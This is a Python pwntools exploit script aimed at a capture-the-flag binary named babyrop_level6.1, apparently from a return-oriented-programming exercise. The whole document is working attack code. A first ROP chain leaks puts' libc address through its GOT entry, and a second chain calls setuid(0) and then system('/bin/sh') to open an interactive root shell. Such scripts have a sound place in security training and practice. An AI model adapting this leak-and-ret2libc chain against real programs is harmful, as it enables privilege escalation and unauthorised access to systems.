from pwn import *

elf = context.binary = ELF('/challenge/babyrop_level6.1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

offset = 40

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

puts_plt = elf.sym.puts
puts_got = elf.got.puts
challenge = elf.sym.challenge

payload = b'A'*offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(challenge)

#leak
p.sendline(payload)
p.recvuntil(b'Leaving!')
out = p.recv().strip().split(b'\n')[0]
leak = u64(b'\x20' + out.ljust(7,b'\x00'))
log.info(f'puts leak : {hex(leak)}')
puts_offset = libc.sym.puts
libc_base = leak - puts_offset
log.info(f'libc leak : {hex(libc_base)}')

#ret2plt
ret = 0x000000000040101a
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.sym.system
setuid = libc_base + libc.symbols['setuid']
payload = b'A'*40
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(setuid)
payload += p64(pop_rdi)
payload += p64(bin_sh)
# payload += p64(ret)
payload += p64(system)

p.sendline(payload)

p.interactive()
